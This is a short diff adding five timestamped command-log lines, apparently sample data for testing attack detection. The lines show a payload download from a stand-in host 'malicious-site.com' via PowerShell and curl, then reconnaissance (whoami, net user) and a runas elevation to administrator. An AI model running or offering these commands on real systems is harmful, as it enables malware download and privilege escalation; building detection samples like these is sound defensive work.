@@ -1,0 +1,5 @@
+2026-11-15T05:18:47.265831 | powershell Invoke-WebRequest http://malicious-site.com
+2026-11-15T05:18:47.265831 | curl http://malicious-site.com/payload.exe
+2026-11-15T05:23:47.265831 | whoami
+2026-11-15T05:23:47.265831 | net user
+2026-11-15T05:23:47.265831 | runas /user:administrator cmd
